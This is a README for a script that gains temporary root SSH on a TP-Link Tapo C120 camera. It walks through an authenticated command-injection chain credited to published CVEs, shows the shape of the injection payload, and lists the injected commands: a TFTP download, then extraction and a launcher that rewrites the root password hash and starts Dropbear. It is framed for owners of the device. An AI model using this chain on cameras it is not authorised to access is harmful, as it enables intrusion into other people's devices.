# Tapo C120 RCE

Temporary root SSH access for your own TP-Link Tapo C120 camera.

This script logs in with your normal Tapo credentials, transfers a small Dropbear bundle over TFTP, starts Dropbear on the camera, and opens `ssh` as `root`.

This was tested on a Tapo C120. The underlying vulnerability chain may also work on other Tapo camera models with the same `setLedStatus` / `testUsrDefAudio` / `set_region_code` behavior, but those models are untested here.

## How It Gets Root

This root path is based on Spaceraccoon's TP-Link Tapo C260 research, which documented the vulnerability chain behind CVE-2026-0651, CVE-2026-0652, and CVE-2026-0653. The same bug class and command path were verified on the Tapo C120 and adapted here to stage temporary Dropbear SSH.

Reference: [Getting a Shell on the Tapo C260 Camera](https://spaceraccoon.dev/getting-shell-tapo-c260-webcam/)

The stock firmware has an authenticated command-injection path. The vulnerable path is useful because the process that reaches it is already running as `root`.

The chain is:

1. The script logs in to the camera using valid Tapo credentials.
2. It calls `setLedStatus`, but sends extra nested config data with it.
3. The firmware accepts that nested data and writes it into `tp_manage.info.dev_name`.
4. The script sets `dev_name` to a short shell payload, for example a command wrapped like `;(command)>/tmp/output 2>&1;#`.
5. The script calls `testUsrDefAudio` with `device_info.set_region_code.region`.
6. That reaches the firmware's region-code handler, which reads `tp_manage.info.dev_name`.
7. The handler builds and executes a shell command similar to:

```sh
wlan_operate get_oemid <region> <dev_name>
```

Because `<dev_name>` is inserted into that shell command without proper escaping, the payload in `dev_name` runs as `root`.

The Dropbear stager uses that root command execution only three times:

1. Download the stage bundle from your computer:

```sh
tftp -g -r s -l /tmp/s <your-computer-ip>
```

2. Extract it:

```sh
cd /tmp && tar xzf s && chmod +x d a
```

3. Run the launcher:

```sh
cd /tmp && sh a
```

The launcher updates the runtime `root` password hash in `/etc/passwd` and `/etc/shadow` to match the Tapo password you entered, generates a temporary Dropbear host key, and starts Dropbear on port `2222`.

Before the first payload is written, the script reads the camera's current `tp_manage.info.dev_name` and `tp_manage.factory_mode.enabled` values. After each bootstrap command, it restores those exact values. If it cannot read the original values, it refuses to run instead of guessing model-specific defaults.

This is temporary runtime access. The staged files, Dropbear host key, and logs are placed under `/tmp`, so they should disappear after a normal reboot.

## Files

Put these three files in the same directory:

```text
tapo_c120_dropbear_stage.py
tapo_c120_repl.py
dropbearmulti-armhf
```

That is all the script needs. There are no hard-coded local paths.

## Requirements

- Python 3
- OpenSSH client (`ssh`)
- Camera and computer on the same local network
- Firewall allowing inbound UDP port `69` on your computer
- Your Tapo username and password

On Linux/macOS, binding UDP port `69` usually requires `sudo`.

## Run

Windows:

```powershell
python .\tapo_c120_dropbear_stage.py
```

Linux/macOS:

```sh
sudo python3 ./tapo_c120_dropbear_stage.py
```

The script will ask for:

```text
Camera IP/host:
Tapo username:
Tapo password, also used for root SSH:
```

When it opens SSH, log in as `root` with the same Tapo password you just entered.

## Common Options

```sh
python3 ./tapo_c120_dropbear_stage.py --host 192.168.50.196 --user you@example.com
```

Useful flags:

| Option | Description |
| --- | --- |
| `--host <ip>` | Camera IP address. Must be a private/local address. |
| `--user <email>` | Tapo account username. |
| `--dropbear-bin <path>` | Path to the ARM Dropbear or `dropbearmulti` binary, if it is not named `dropbearmulti-armhf` next to the script. |
| `--tftp-host <ip>` | Your computer's LAN IP, useful if auto-detection picks the wrong interface. |
| `--ssh-port <port>` | Port for Dropbear on the camera. Default: `2222`. |
| `--debug-payload` | Print the injected bootstrap payloads for debugging. |
| `--no-ssh` | Start Dropbear but do not launch the local SSH client. |
| `--keep-stage` | Keep the temporary local TFTP staging folder for debugging. |

Do not change `--tftp-port`; the camera-side TFTP client expects UDP port `69`.

## Troubleshooting

If no TFTP request appears, check your firewall or pass your LAN IP explicitly:

```powershell
python .\tapo_c120_dropbear_stage.py --tftp-host 192.168.50.200
```

If SSH connects and closes immediately, read the camera log:

```text
/tmp/dropbear.log
```

If login attempts are throttled, wait for the camera's countdown to expire or simply reboot it.

If the script cannot read the original `tp_manage.info.dev_name` or `tp_manage.factory_mode.enabled` values, it stops before staging Dropbear. That means this firmware did not expose the values through the read-only calls the script knows about yet.

## Cleanup

The staged SSH server lives in `/tmp`, so rebooting the camera should remove it.

Manual cleanup during the same boot:

```sh
killall dropbear
rm -f /tmp/d /tmp/a /tmp/h /tmp/s /tmp/m /tmp/dropbear.log
```

The script saves temporary runtime backups here:

```text
/tmp/passwd.before_dropbear
/tmp/shadow.before_dropbear
```

## Notes

- Use this only on cameras you own or are authorized to administer.
- Tested on a Tapo C120; other Tapo models may work if they share the same vulnerable firmware path.
- The script snapshots and restores the target camera's original `dev_name` and `factory_mode.enabled` values.
- The root SSH password is the Tapo password typed at the prompt.
- The script stores only a SHA-512 crypt hash on the camera.
- Keep the camera off untrusted networks while temporary SSH is running.

## Credits

Credit for the original Tapo vulnerability chain goes to Spaceraccoon, who published the C260 research and associated CVEs:

- CVE-2026-0651: authenticated local file disclosure
- CVE-2026-0652: remote code execution
- CVE-2026-0653: privilege escalation
- Writeup: [Getting a Shell on the Tapo C260 Camera](https://spaceraccoon.dev/getting-shell-tapo-c260-webcam/)
